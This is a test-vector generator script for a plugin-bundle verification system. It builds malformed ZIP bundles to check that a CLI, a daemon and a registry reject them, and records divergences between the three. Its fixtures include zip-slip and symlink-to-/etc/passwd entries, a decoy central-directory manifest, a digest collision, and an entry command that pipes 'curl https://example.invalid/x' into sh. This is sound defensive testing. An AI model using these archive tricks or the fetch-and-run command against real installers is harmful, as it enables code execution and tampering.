#!/usr/bin/env node
// Regenerate the golden bundles and `vectors.json`.
//
//   node testdata/bundles/generate.mjs            # rewrite the goldens
//   node testdata/bundles/generate.mjs --check    # fail if they would change
//
// The `.astraplugin` files in this directory are COMMITTED. This script is how
// they came to exist and how a reviewer re-derives them; it is not run by any
// test suite. That distinction is the point: a suite that regenerated its own
// fixtures would be asserting that today's code agrees with today's code. The
// three readers under test are asserted against bytes that were frozen, and
// against digests written down next to them.
//
// `--check` is what CI runs. It regenerates into memory and compares; a diff
// means somebody changed the generator without refreshing the goldens, which is
// exactly the moment the digests in `vectors.json` stop describing the files.
//
// The expected digests in `vectors.json` are NOT authoritative on their own —
// see README.md, "The fourth implementation". They are cross-checked against
// coreutils `sha256sum`, which shares no code with node, with sha2, or with
// each other's SHA-256.

import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { writeZip, STORED, DEFLATE, S_IFLNK } from "./zip.mjs";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const sha256 = (b) => crypto.createHash("sha256").update(b).digest("hex");

/** `SHA256("astra.bundle/2\0" || manifest_bytes)` — the domain-separated form. */
const MANIFEST_DIGEST_DOMAIN = Buffer.from("astra.bundle/2\u0000", "latin1");
const manifestDigest = (bytes) =>
  crypto.createHash("sha256").update(MANIFEST_DIGEST_DOMAIN).update(bytes).digest("hex");

// ---------------------------------------------------------------------------
// Manifest bytes, byte-for-byte as the CLI's packer writes them
// ---------------------------------------------------------------------------
//
// `serde_json::to_vec_pretty` + a trailing newline, with the field order taken
// from the `BundleManifest` struct definition. The digest is over these exact
// bytes, so the order and the whitespace are load-bearing: reorder one key and
// every manifest digest below changes while every file in the archive stays
// identical. Reproducing the packer's encoding here rather than importing it is
// deliberate — this file is a fourth implementation, and a vector generated by
// the implementation under test proves nothing.

/**
 * @param {object} m fields in struct order
 * @returns {Buffer}
 */
function manifestBytes(m) {
  const ordered = {
    schema: m.schema ?? "astra.bundle/2",
    plugin_id: m.plugin_id,
    version: m.version,
    platform: m.platform,
    protocol: m.protocol ?? 1,
    min_astra_version: m.min_astra_version ?? "",
    capabilities: m.capabilities ?? ["tools"],
    permissions: m.permissions ?? {},
    permissions_hash: m.permissions_hash ?? permissionsHash({}),
    entry: m.entry,
    files: m.files,
  };
  return Buffer.from(JSON.stringify(ordered, null, 2) + "\n", "utf8");
}

/**
 * `sha256:` + hex over the compact, key-sorted encoding of the permission map.
 *
 * RFC 8785 for a value of this shape: the map holds strings and objects only,
 * so the whole of JCS reduces to "sort the keys, drop the whitespace". No
 * numbers, which is where JCS's rules actually bite.
 */
function permissionsHash(permissions) {
  const sorted = {};
  for (const k of Object.keys(permissions).sort()) sorted[k] = permissions[k];
  return `sha256:${sha256(Buffer.from(JSON.stringify(sorted), "utf8"))}`;
}

/**
 * The retired in-ZIP digest: `SHA256(name₀‖content₀‖name₁‖content₁‖…)` in ZIP
 * index order, skipping SIGNATURE and PUBKEY. No delimiters, no length
 * prefixes, no entry count, no domain separator.
 *
 * Reimplemented here — from `PluginManager::verify_signature` — for one
 * purpose: to show that it maps two different archives to one number. Nothing
 * else in this repo should ever compute it.
 */
function legacyConcatDigest(entries) {
  const h = crypto.createHash("sha256");
  for (const e of entries) {
    if (e.name === "SIGNATURE" || e.name === "PUBKEY" || e.hidden) continue;
    h.update(Buffer.from(e.name, "utf8"));
    h.update(Buffer.isBuffer(e.data) ? e.data : Buffer.from(e.data, "utf8"));
  }
  return h.digest("hex");
}

// ---------------------------------------------------------------------------
// Shared source material
// ---------------------------------------------------------------------------

const ID = "vector-plugin";
const VERSION = "1.0.0";

const BIN = Buffer.from("#!/bin/sh\necho astra-test-vector\n", "utf8");
const LINUX = { os: "linux", arch: "x86_64" };
const ANY = { os: "any", arch: "any" };

/** A `plugin.toml` the daemon's `PluginManifest::from_str` accepts. */
function pluginToml(id = ID, command = "./bin/fixture") {
  return Buffer.from(
    [
      "[plugin]",
      `id = "${id}"`,
      'name = "Vector Plugin"',
      `version = "${VERSION}"`,
      'description = "A golden bundle. Not a plugin — it does nothing."',
      'license = "MIT"',
      "",
      "[entry]",
      `command = "${command}"`,
      "",
      "[capabilities]",
      "tools = true",
      "",
    ].join("\n"),
    "utf8",
  );
}

const TOML = pluginToml();

/** A `MANIFEST.files` line, computed from the bytes rather than declared. */
const listed = (p, data, mode) => ({
  path: p,
  sha256: sha256(data),
  size: data.length,
  mode,
});

/** The two-file manifest every "ordinary" vector varies from. */
function baseManifest(over = {}) {
  return {
    plugin_id: ID,
    version: VERSION,
    platform: LINUX,
    entry: { command: "./bin/fixture", args: [] },
    files: [listed("bin/fixture", BIN, "0755"), listed("plugin.toml", TOML, "0644")],
    ...over,
  };
}

const ENTRY_BIN = { name: "bin/fixture", data: BIN, mode: 0o100755 };
const ENTRY_TOML = { name: "plugin.toml", data: TOML, mode: 0o100644 };
const manifestEntry = (bytes, method = STORED) => ({
  name: "MANIFEST.json",
  data: bytes,
  mode: 0o100644,
  method,
});

// ---------------------------------------------------------------------------
// The vectors
// ---------------------------------------------------------------------------
//
// `verdict` is the answer the format's rules give. `expect` is what each of the
// three implementations does TODAY, asserted by that repo's suite. Where the
// two disagree there is a `divergence`, and that field is a defect record with
// a test attached: closing the defect turns a suite red until the entry is
// deleted, which is the only way a known gap stays known.

const vectors = [];

/**
 * @param {object} v
 * @param {string} v.name
 * @param {"accept"|"reject"} v.verdict
 * @param {string} v.layer which check is expected to catch it
 * @param {string} v.why what breaks if no implementation catches this
 * @param {{cli: string, daemon: string, registry: string}} v.expect
 * @param {object} [v.divergence]
 * @param {object} [v.extra] extra fields recorded in vectors.json
 * @param {{entries: object[], centralOverrides?: object, manifestBytes?: Buffer}} v.archive
 */
function vector(v) {
  vectors.push(v);
}

// ── accepted ──────────────────────────────────────────────────────────────

{
  const m = manifestBytes(baseManifest());
  vector({
    name: "ok-minimal",
    verdict: "accept",
    layer: "bundle-structure",
    why:
      "The control. Every rejection below has to be a rejection OF something, and " +
      "an implementation that refused this would fail closed on every real plugin.",
    expect: { cli: "accept", daemon: "accept", registry: "accept" },
    archive: { entries: [manifestEntry(m), ENTRY_BIN, ENTRY_TOML], manifestBytes: m },
  });
}

{
  const src = Buffer.from("console.log('astra-test-vector');\n", "utf8");
  const toml = pluginToml(ID, "node");
  const m = manifestBytes({
    plugin_id: ID,
    version: VERSION,
    platform: ANY,
    capabilities: ["tools"],
    entry: { command: "node", args: ["src/index.js"] },
    files: [listed("plugin.toml", toml, "0644"), listed("src/index.js", src, "0644")],
  });
  vector({
    name: "ok-noarch-runtime",
    verdict: "accept",
    layer: "bundle-structure",
    why:
      "`noarch` is a first-class platform value and `entry.command` may name a host " +
      "runtime rather than a file in the bundle. Both are how every TypeScript and " +
      "Python plugin ships, and nothing else in this set exercises either — an " +
      "implementation that tightened `entry.command` to 'must be a listed file' would " +
      "make the whole scripted half of the catalogue uninstallable.",
    expect: { cli: "accept", daemon: "accept", registry: "accept" },
    archive: {
      entries: [
        manifestEntry(m),
        { name: "plugin.toml", data: toml, mode: 0o100644 },
        { name: "src/index.js", data: src, mode: 0o100644 },
      ],
      manifestBytes: m,
    },
  });
}

{
  const perms = {
    fire_trigger: { reason: "Fires the on_dice_roll trigger you configure" },
    subscribe_events: { reason: "Watches for command_completed" },
  };
  const m = manifestBytes(baseManifest({ permissions: perms, permissions_hash: permissionsHash(perms) }));
  vector({
    name: "ok-permissions",
    verdict: "accept",
    layer: "bundle-structure",
    why:
      "Three independent implementations of RFC 8785 have to agree on the canonical " +
      "bytes of the permission map, or `permissions_hash` compares unequal across the " +
      "repo boundary it exists to cross. The suites recompute the hash from the " +
      "manifest's own `permissions` object and assert it against the recorded one, so " +
      "a canonicalisation that drifts is caught here rather than at a user's consent " +
      "sheet.",
    expect: { cli: "accept", daemon: "accept", registry: "accept" },
    extra: { permissions_hash: permissionsHash(perms) },
    archive: { entries: [manifestEntry(m), ENTRY_BIN, ENTRY_TOML], manifestBytes: m },
  });
}

{
  const m = manifestBytes(baseManifest());
  vector({
    name: "ok-legacy-signed",
    verdict: "accept",
    layer: "bundle-structure",
    why:
      "The retiring in-ZIP pair is still read for two releases, and it is only readable " +
      "if it stays the last two entries in that order — the digest it carries is " +
      "computed over everything before it. A bundle with SIGNATURE/PUBKEY must still " +
      "verify structurally while that is true.",
    expect: { cli: "accept", daemon: "accept", registry: "accept" },
    extra: { legacy_pair: true },
    archive: {
      entries: [
        manifestEntry(m),
        ENTRY_BIN,
        ENTRY_TOML,
        { name: "SIGNATURE", data: Buffer.from("bm90LWEtcmVhbC1zaWduYXR1cmU=\n", "utf8") },
        { name: "PUBKEY", data: Buffer.from("bm90LWEtcmVhbC1rZXk=\n", "utf8") },
      ],
      manifestBytes: m,
    },
  });
}

// ── the concatenation collision ───────────────────────────────────────────
//
// The retired digest is `SHA256(name₀‖content₀‖name₁‖content₁‖…)`: no
// delimiters, no length prefixes, no entry count. Entry "a" with content "bc"
// and entry "ab" with content "c" both contribute the bytes `abc`, so the two
// archives below hash to ONE number under that scheme — and one legacy
// SIGNATURE authenticates both. The v2 manifest names each file and pins its
// digest, so the swap is refused; that is the whole argument for retiring the
// old construction and for domain-separating what replaced it.
//
// Both vectors carry the SAME MANIFEST.json bytes. That is what makes them a
// collision pair rather than two unrelated bundles.

{
  const A = Buffer.from("bc", "utf8");
  const m = manifestBytes({
    plugin_id: ID,
    version: VERSION,
    platform: LINUX,
    entry: { command: "./bin/fixture", args: [] },
    files: [
      listed("a", A, "0644"),
      listed("bin/fixture", BIN, "0755"),
      listed("plugin.toml", TOML, "0644"),
    ],
  });

  vector({
    name: "collision-a-bc",
    verdict: "accept",
    layer: "bundle-structure",
    why:
      'The honest half of the "ab"+"c" / "a"+"bc" pair: an entry named `a` whose ' +
      "content is `bc`. Its `legacy_concat_sha256` is identical to `collision-ab-c`'s.",
    expect: { cli: "accept", daemon: "accept", registry: "accept" },
    extra: { collision_group: "abc" },
    archive: {
      entries: [manifestEntry(m), { name: "a", data: A }, ENTRY_BIN, ENTRY_TOML],
      manifestBytes: m,
    },
  });

  const AB = Buffer.from("c", "utf8");
  vector({
    name: "collision-ab-c",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "The attack. Byte-for-byte the same MANIFEST.json as `collision-a-bc`, so the " +
      "same manifest digest, and byte-for-byte the same retired concatenation digest — " +
      "one legacy SIGNATURE validates both archives. But the archive holds `ab` with " +
      "content `c` instead of `a` with content `bc`, and v2 refuses it twice over: `ab` " +
      "is an entry no manifest line covers, and `a` is a manifest line no entry " +
      "satisfies. Delete either half of the exhaustiveness check and this vector " +
      "installs.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    extra: { collision_group: "abc" },
    archive: {
      entries: [manifestEntry(m), { name: "ab", data: AB }, ENTRY_BIN, ENTRY_TOML],
      manifestBytes: m,
    },
  });
}

// ── exhaustiveness, both directions ───────────────────────────────────────

{
  const m = manifestBytes(baseManifest());
  vector({
    name: "extra-file",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "An entry `MANIFEST.files` does not list is a file the extractor writes and " +
      "nothing hashes. Checking only 'listed ⇒ present' leaves this open, and it is the " +
      "cheapest way to add a payload to a bundle whose digest was already approved.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: {
      entries: [
        manifestEntry(m),
        { name: "bin/backdoor", data: Buffer.from("payload\n", "utf8"), mode: 0o100755 },
        ENTRY_BIN,
        ENTRY_TOML,
      ],
      manifestBytes: m,
    },
  });
}

{
  const m = manifestBytes(baseManifest());
  vector({
    name: "missing-file",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "The other direction: dropping an entry must not make the bundle look intact. A " +
      "reader that checks only 'present ⇒ listed' would install a plugin whose entry " +
      "binary is simply absent, and diagnose it as a spawn failure.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: { entries: [manifestEntry(m), ENTRY_TOML], manifestBytes: m },
  });
}

{
  const m = manifestBytes(baseManifest());
  vector({
    name: "duplicate-entry",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "Two entries named `plugin.toml`. The first matches the manifest and is hashed; " +
      "the second overwrites it on disk and is not. Every per-file digest in the " +
      "manifest is worth nothing if the last writer wins.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: {
      entries: [
        manifestEntry(m),
        ENTRY_BIN,
        ENTRY_TOML,
        { name: "plugin.toml", data: Buffer.from('[plugin]\nid = "hijacked"\n', "utf8") },
      ],
      manifestBytes: m,
    },
  });
}

{
  const EVIL = Buffer.from('[plugin]\nid = "hijacked"\n', "utf8");
  const m = manifestBytes({
    plugin_id: ID,
    version: VERSION,
    platform: LINUX,
    entry: { command: "./bin/fixture", args: [] },
    // Sorted byte-lexicographically: 'P' (0x50) sorts before 'b' and 'p'.
    files: [
      listed("Plugin.TOML", EVIL, "0644"),
      listed("bin/fixture", BIN, "0755"),
      listed("plugin.toml", TOML, "0644"),
    ],
  });
  vector({
    name: "duplicate-entry-case",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "`plugin.toml` and `Plugin.TOML` are two entries to a ZIP reader and ONE file on " +
      "NTFS and APFS. Both are listed with honest digests, so every per-file check " +
      "passes — and then the second silently overwrites the first, after the first was " +
      "hashed. This is `duplicate-entry` with the collision moved from the ZIP into the " +
      "filesystem, and it is the variant a case-sensitive `seen` set does not see.",
    expect: { cli: "accept", daemon: "reject", registry: "accept" },
    divergence: {
      finding: "F1",
      summary:
        "Only the daemon folds case before looking for duplicates. `astra-plugin verify` " +
        "and the registry bot both use an exact-match set, so a bundle that cannot be " +
        "safely extracted on Windows or macOS passes the author's check and the " +
        "registry's, and is refused only on the user's machine.",
      severity:
        "Fail-closed, so not an installation hole — a DX and review hole. The registry " +
        "would publish a listing no Windows or macOS user can install.",
      fix: "Fold with `to_lowercase()` in astra-plugin-cli/src/bundle.rs and bot/lib/bundle.mjs.",
    },
    archive: {
      entries: [
        manifestEntry(m),
        { name: "Plugin.TOML", data: EVIL, mode: 0o100644 },
        ENTRY_BIN,
        ENTRY_TOML,
      ],
      manifestBytes: m,
    },
  });
}

{
  const TARGET = Buffer.from("/etc/passwd", "utf8");
  const m = manifestBytes({
    plugin_id: ID,
    version: VERSION,
    platform: LINUX,
    entry: { command: "./bin/fixture", args: [] },
    files: [
      listed("bin/fixture", BIN, "0755"),
      listed("bin/link", TARGET, "0777"),
      listed("plugin.toml", TOML, "0644"),
    ],
  });
  vector({
    name: "symlink-entry",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "A symlink entry's CONTENT is a path. Every traversal guard in this project " +
      "validates the entry's own name, which here is the innocuous `bin/link`; the " +
      "escape is in the eleven bytes it points at. Extract it and the next write through " +
      "that name lands wherever the link says.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: {
      entries: [
        manifestEntry(m),
        ENTRY_BIN,
        { name: "bin/link", data: TARGET, mode: S_IFLNK | 0o777 },
        ENTRY_TOML,
      ],
      manifestBytes: m,
    },
  });
}

// ── content, not just the file set ────────────────────────────────────────

{
  const m = manifestBytes(baseManifest());
  vector({
    name: "content-digest-mismatch",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "The file set is exactly right and one file's bytes are not. This is what the " +
      "per-file digests are FOR, and the set-level checks above all pass on it — an " +
      "implementation that only reconciled names would accept a swapped binary.",
    expect: { cli: "reject", daemon: "accept", registry: "reject" },
    divergence: {
      finding: "F2",
      summary:
        "By design, not a defect: the daemon's `bundle::check_structure` reads the " +
        "central directory only and never inflates a byte, so content digests are " +
        "checked during extraction (`ops::install_plugin::extract_archive`), where the " +
        "bytes that land on disk and the bytes that are hashed are provably the same " +
        "bytes. The daemon suite asserts the structural pass here and leaves the digest " +
        "to that file's own tests.",
      severity: "None. Recorded so 'the daemon accepted it' is never read as a gap.",
      fix: "n/a — hashing here would hash the archive twice and still leave a gap.",
    },
    archive: {
      entries: [
        manifestEntry(m),
        // Same length, different bytes: a size check alone would not see this.
        { name: "bin/fixture", data: Buffer.from("#!/bin/sh\necho astra-test-vecto2\n", "utf8"), mode: 0o100755 },
        ENTRY_TOML,
      ],
      manifestBytes: m,
    },
  });
}

{
  const base = baseManifest();
  base.files[0].size = base.files[0].size + 1;
  const m = manifestBytes(base);
  vector({
    name: "size-mismatch",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "The manifest's declared size is what bounds streaming extraction. A lie has to " +
      "be refused before any work is done, so the extraction-time ceiling is the " +
      "manifest's number and not the archive's self-description.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: { entries: [manifestEntry(m), ENTRY_BIN, ENTRY_TOML], manifestBytes: m },
  });
}

{
  const base = baseManifest();
  base.files[0].mode = "0644";
  const m = manifestBytes(base);
  vector({
    name: "mode-mismatch",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "Modes are applied from the manifest, so a manifest that says 0644 while the " +
      "archive says 0755 leaves the reader and the extractor disagreeing about whether " +
      "the entry binary is executable. The dangerous direction is the mirror of this " +
      "one — a manifest claiming 0644 for an archive entry that is 0777.",
    expect: { cli: "reject", daemon: "reject", registry: "accept" },
    divergence: {
      finding: "F3",
      summary:
        "The registry bot does not compare `MANIFEST.files[].mode` against the " +
        "archive's external attributes at all; `bot/lib/bundle.mjs` checks path, size " +
        "and sha256 only.",
      severity:
        "Low. The daemon applies the manifest's mode and refuses the mismatch, so the " +
        "bytes on disk are still what the manifest describes. It means a listing can be " +
        "approved for a bundle no daemon will install.",
      fix: "Compare `(e.unixMode & 0o777)` to `parseInt(f.mode, 8) & 0o777` in checkBundle.",
    },
    archive: { entries: [manifestEntry(m), ENTRY_BIN, ENTRY_TOML], manifestBytes: m },
  });
}

{
  const base = baseManifest();
  base.files[0].sha256 = base.files[0].sha256.toUpperCase();
  const m = manifestBytes(base);
  vector({
    name: "uppercase-digest",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "Digests are compared as strings everywhere in this system. An uppercase one " +
      "never matches anything any implementation computes, so it must be refused AS a " +
      "malformed manifest — otherwise it surfaces as 'this file is corrupt', and the " +
      "author goes looking at the wrong end of the pipeline.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: { entries: [manifestEntry(m), ENTRY_BIN, ENTRY_TOML], manifestBytes: m },
  });
}

{
  const base = baseManifest();
  base.files.reverse();
  const m = manifestBytes(base);
  vector({
    name: "unsorted-files",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "`files` is specified sorted, so a reader is entitled to binary-search it. An " +
      "unsorted list makes that silently wrong for exactly the entries someone bothered " +
      "to move, and 'the lookup missed it' reads identically to 'it was not listed'.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: { entries: [manifestEntry(m), ENTRY_BIN, ENTRY_TOML], manifestBytes: m },
  });
}

// ── invariant 1: the manifest is entry zero, stored, and is the one enforced ──

{
  const m = manifestBytes(baseManifest());
  vector({
    name: "manifest-not-first",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "The manifest is entry zero so a reader can lift it out of the first few hundred " +
      "bytes without inflating attacker-controlled input and without trusting a central " +
      "directory. Moving it must be a refusal and never a fall-back to the pre-v2 " +
      "rules — otherwise reordering one entry switches off per-file hashing, which is " +
      "the only thing v2 adds.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: { entries: [ENTRY_TOML, manifestEntry(m), ENTRY_BIN], manifestBytes: m },
  });
}

{
  const m = manifestBytes(baseManifest());
  vector({
    name: "manifest-compressed",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "Entry zero is `MANIFEST.json` and it deflates. The manifest is stored precisely " +
      "so that reading it needs no decompressor pointed at bytes nobody has checked " +
      "yet; a reader that inflates it to find out what the archive may contain has " +
      "already done the thing the ordering was designed to avoid.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: {
      entries: [manifestEntry(m, DEFLATE), ENTRY_BIN, ENTRY_TOML],
      manifestBytes: m,
    },
  });
}

{
  // Two manifests. The one at offset 0 is honest and is what the daemon
  // enforces; the central directory's `MANIFEST.json` record is repointed at a
  // second, hidden local record carrying a manifest that also lists
  // `bin/backdoor`. A reader that trusts the central directory approves the
  // decoy; a reader that starts at byte zero enforces the honest one.
  const honest = manifestBytes(baseManifest());
  const BACKDOOR = Buffer.from("payload\n", "utf8");
  const decoy = manifestBytes(
    baseManifest({
      files: [
        listed("bin/backdoor", BACKDOOR, "0755"),
        listed("bin/fixture", BIN, "0755"),
        listed("plugin.toml", TOML, "0644"),
      ],
    }),
  );
  vector({
    name: "header-disagree",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "The central directory is appended last and nothing in the ZIP format forces it " +
      "to describe the archive it is attached to. Here it names `MANIFEST.json` and " +
      "points at a manifest that is not the one at byte zero. The registry bot reads " +
      "the central directory; the daemon reads the local header. Left unchecked, the " +
      "registry hashes, displays and countersigns a manifest no daemon ever enforces — " +
      "the single most v2-specific attack there is, and the plan's list does not name " +
      "it. Both readings, compared, is the only way to notice.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: {
      entries: [
        manifestEntry(honest),
        { name: "bin/backdoor", data: BACKDOOR, mode: 0o100755 },
        ENTRY_BIN,
        ENTRY_TOML,
        { name: "MANIFEST.json", data: decoy, mode: 0o100644, hidden: true },
      ],
      // Central entry 0 keeps the name MANIFEST.json and is repointed at the
      // hidden record, whose offset is filled in after the layout is known.
      repointFirstAtHidden: true,
      manifestBytes: honest,
      manifestBytesCentral: decoy,
    },
  });
}

// ── path shape ────────────────────────────────────────────────────────────
//
// These carry the offending entry UNLISTED. The listed variants belong to the
// extractor, which is where the daemon enforces path shape
// (`ops::install_plugin::safe_relative_path`, with its own tests); putting them
// here would assert that a structural reader does a job it deliberately leaves
// to the pass that writes the files.

for (const [name, entryName, why] of [
  [
    "path-traversal",
    "../escape",
    "`..` in an entry name is zip-slip. Refused by name shape in the CLI and the bot, " +
      "and by exhaustiveness everywhere — a traversal entry is by construction one the " +
      "manifest cannot honestly list.",
  ],
  [
    "path-ads",
    "bin/fixture:stream",
    "A colon names an NTFS alternate data stream: `bin/fixture:stream` writes INTO " +
      "`bin/fixture` on Windows, past every check that looked at the entry called " +
      "`bin/fixture`, and the payload is invisible to a directory listing.",
  ],
  [
    "path-trailing-dot",
    "bin/fixture.",
    "Windows silently strips a trailing dot, so `bin/fixture.` and `bin/fixture` are " +
      "two entries here and one file there — the second overwrites the first after the " +
      "first has been hashed.",
  ],
]) {
  const m = manifestBytes(baseManifest());
  vector({
    name,
    verdict: "reject",
    layer: "bundle-structure",
    why,
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: {
      entries: [
        manifestEntry(m),
        ENTRY_BIN,
        { name: entryName, data: Buffer.from("payload\n", "utf8"), mode: 0o100644 },
        ENTRY_TOML,
      ],
      manifestBytes: m,
    },
  });
}

// ── entry.command ─────────────────────────────────────────────────────────

{
  const toml = pluginToml(ID, "sh");
  const m = manifestBytes({
    plugin_id: ID,
    version: VERSION,
    platform: LINUX,
    entry: { command: "sh", args: ["-c", "curl https://example.invalid/x | sh"] },
    files: [listed("bin/fixture", BIN, "0755"), listed("plugin.toml", toml, "0644")],
  });
  vector({
    name: "entry-command-shell",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "`entry.command` is what the daemon executes. A shell turns `args` — which no " +
      "part of the format constrains — into arbitrary code, and it is not a file in the " +
      "bundle, so nothing in `files` covers what actually runs.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: {
      entries: [manifestEntry(m), ENTRY_BIN, { name: "plugin.toml", data: toml, mode: 0o100644 }],
      manifestBytes: m,
    },
  });
}

{
  const m = manifestBytes(baseManifest({ entry: { command: "../../../bin/sh", args: [] } }));
  vector({
    name: "entry-command-escape",
    verdict: "reject",
    layer: "bundle-structure",
    why:
      "The install directory is the jail. A command with `..` in it resolves outside " +
      "and names a binary no digest in this bundle covers.",
    expect: { cli: "reject", daemon: "reject", registry: "reject" },
    archive: { entries: [manifestEntry(m), ENTRY_BIN, ENTRY_TOML], manifestBytes: m },
  });
}

// ── the plugin id, which becomes a directory name ─────────────────────────

for (const [name, id, why] of [
  [
    "plugin-id-traversal",
    "../evil",
    "`plugin.id` becomes a path component the moment an archive is installed: " +
      "`<plugins_dir>/<id>` is created, written to, and `remove_dir_all`'d. `../evil` " +
      "aims all three one level up.",
  ],
  [
    "plugin-id-con",
    "con",
    "`con` is a Windows device name. `<plugins_dir>/con` cannot be created there at " +
      "all, so an id the registry accepted would be installable on Linux and broken on " +
      "Windows — and the Linux CI would never see it.",
  ],
]) {
  const toml = pluginToml(id);
  const m = manifestBytes({
    plugin_id: id,
    version: VERSION,
    platform: LINUX,
    entry: { command: "./bin/fixture", args: [] },
    files: [listed("bin/fixture", BIN, "0755"), listed("plugin.toml", toml, "0644")],
  });
  vector({
    name,
    verdict: "reject",
    layer: "plugin-id",
    why,
    expect: { cli: "accept", daemon: "reject", registry: "reject" },
    extra: { plugin_id: id },
    divergence: {
      finding: "F4",
      summary:
        "Neither the CLI's bundle reader nor `astra-plugin check` refuses these. " +
        "`Bundle::open` never looks at `MANIFEST.plugin_id`, and `commands/validate.rs` " +
        "checks the id charset but has no reserved-device-name rule — so `con` passes " +
        "`astra-plugin check` outright, and `../evil` is caught only by the charset " +
        "rule, in `check`, not in `verify`.",
      severity:
        "Fail-closed at install: the daemon's `PluginManifest::validate` refuses both, " +
        "and so does the registry's `invalidId`. The cost is that an author gets a " +
        "green `astra-plugin verify` on a bundle no user can install and no registry " +
        "will list.",
      fix:
        "Port `is_reserved_device_name` into the CLI, and have `Bundle::open` validate " +
        "`MANIFEST.plugin_id` with the same rule it already applies to archive paths.",
    },
    archive: {
      entries: [manifestEntry(m), ENTRY_BIN, { name: "plugin.toml", data: toml, mode: 0o100644 }],
      manifestBytes: m,
    },
  });
}

// ── permissions ───────────────────────────────────────────────────────────

{
  const perms = { fire_trigger: { reason: "Fires the trigger you configure" } };
  // The hash of an EMPTY permission map, recorded against a non-empty one.
  const m = manifestBytes(baseManifest({ permissions: perms, permissions_hash: permissionsHash({}) }));
  vector({
    name: "permissions-hash-mismatch",
    verdict: "reject",
    layer: "permissions-hash",
    why:
      "The recorded `permissions_hash` is `sha256({})` while `permissions` asks for " +
      "`fire_trigger`. The hash is what the consent sheet and the update-diff gate " +
      "compare, so a bundle where the two disagree can widen its permissions without " +
      "the number that is supposed to notice ever changing. §5.3-D compares this hash " +
      "against the registry RECORD's; nothing yet compares the manifest against ITSELF, " +
      "and until something does, the manifest's `permissions` block is a field no reader " +
      "authenticates.",
    expect: { cli: "accept", daemon: "accept", registry: "accept" },
    extra: {
      recorded_permissions_hash: permissionsHash({}),
      correct_permissions_hash: permissionsHash(perms),
    },
    divergence: {
      finding: "F5",
      summary:
        "No implementation checks `sha256(canonical(MANIFEST.permissions)) == " +
        "MANIFEST.permissions_hash`. All three read the two fields and reconcile " +
        "neither.",
      severity:
        "Real, and it lands in Phase 4. Today `permissions` is carried and not " +
        "interpreted, so the mismatch is inert. The moment a consent sheet renders " +
        "`permissions` while the update-diff gate compares `permissions_hash`, the two " +
        "describe different plugins and a widening passes as unchanged.",
      fix:
        "One line in each reader, next to the schema check. All three suites already " +
        "recompute the correct hash for this vector, so the check has nothing left to " +
        "invent.",
    },
    archive: { entries: [manifestEntry(m), ENTRY_BIN, ENTRY_TOML], manifestBytes: m },
  });
}

// ---------------------------------------------------------------------------
// Emit
// ---------------------------------------------------------------------------

function build(v) {
  const a = v.archive;
  let overrides = {};
  if (a.repointFirstAtHidden) {
    // Lay the archive out once to learn where the hidden record starts, then
    // repoint central entry 0 at it. Two passes, because the offset of the
    // hidden local record depends on every record before it.
    let offset = 0;
    let hiddenOffset = null;
    for (const e of a.entries) {
      const nameLen = Buffer.byteLength(e.name, "utf8");
      const dataLen = Buffer.isBuffer(e.data) ? e.data.length : Buffer.byteLength(e.data, "utf8");
      if (e.hidden) {
        hiddenOffset = offset;
        break;
      }
      offset += 30 + nameLen + dataLen;
    }
    if (hiddenOffset === null) throw new Error(`${v.name}: repointFirstAtHidden with no hidden entry`);
    overrides = { 0: { offset: hiddenOffset } };
  }
  return writeZip(a.entries, overrides);
}

/**
 * Is entry zero a STORED `MANIFEST.json`? That, and only that, is where a
 * manifest digest can honestly be computed from — invariant 1 exists so a
 * reader never has to consult the central directory to find it.
 */
function manifestAtOffsetZero(v) {
  const first = v.archive.entries[0];
  return (
    v.archive.manifestBytes !== undefined &&
    first !== undefined &&
    first.name === "MANIFEST.json" &&
    (first.method ?? STORED) === STORED &&
    first.hidden !== true
  );
}

/** The registry platform key for a `MANIFEST.platform` pair, or null. */
function platformKey(p) {
  if (!p) return null;
  if (p.os === "any" && p.arch === "any") return "noarch";
  if (p.os === "linux" && p.arch === "x86_64") return "linux-x64";
  if (p.os === "windows" && p.arch === "x86_64") return "windows-x64";
  return null;
}

/** `plugin_id` / `version` / `platform_key`, read back out of the manifest. */
function identity(v) {
  if (!v.archive.manifestBytes) return {};
  const m = JSON.parse(v.archive.manifestBytes.toString("utf8"));
  return { plugin_id: m.plugin_id, version: m.version, platform_key: platformKey(m.platform) };
}

const outputs = [];
for (const v of vectors) {
  const bytes = build(v);
  const file = `${v.name}.astraplugin`;
  const record = {
    name: v.name,
    file,
    verdict: v.verdict,
    layer: v.layer,
    why_it_matters: v.why,
    // What a consumer has to tell its reader this bundle claims to be. The
    // registry bot cross-checks the manifest against the LISTING, so without
    // these it would reject every vector for saying it is `vector-plugin` when
    // the caller asked about something else — an id-mismatch error standing in
    // front of the defect each vector is actually about.
    ...identity(v),
    artifact_sha256: sha256(bytes),
    artifact_size: bytes.length,
